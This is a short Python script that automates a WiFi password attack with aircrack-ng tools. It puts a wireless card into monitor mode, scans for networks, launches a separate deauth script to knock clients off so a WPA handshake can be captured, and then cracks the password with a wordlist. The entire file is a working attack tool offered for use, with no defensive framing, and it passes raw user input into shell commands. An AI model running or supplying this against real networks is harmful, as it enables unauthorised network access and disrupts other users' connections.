import os
from os import system

system("ifconfig")

nic = input("Enter wifi interace name > ")
setup = f"airmon-ng check kill && airmon-ng start {nic} && airmon-ng"

system(setup)

start = f'airodump-ng {nic}mon'

print("\n", "*" * 40, """\nOnce desired network is found, press \033[1;34m CTRL-C \033[0;0m to stop airodump \n""", "*" * 40, "\n")
input("Press enter to continue ...")

system(start)

bssid = input("Type selected bssid > ")

channel = int(input("Enter channel number of selected bssid > "))
location = input("File path for where you would like files saved \033[1;32;40m PLEASE INCLUDE NAME FOR FILE ie: /root/Desktop/apple \033[0;0m > ")


print("\nOnce handshake is captured press \033[1;34m CTRL-C \033[0;0m to end airodump-ng")
print("\n")
input("Press enter to continue ...")

os.system("gnome-terminal -e ./deauth.sh")
airodump2 = f"airodump-ng -c {channel} --bssid {bssid} -w {location} {nic}mon"
system(airodump2)

print("We will now attempt to crack the wifi password \n")
input("Press enter to continue...")

wordlist = input("Enter file path for wordlist you wish to use > ")
aircrack = f"aircrack-ng {location}-01.cap -w {wordlist}"

system(aircrack)
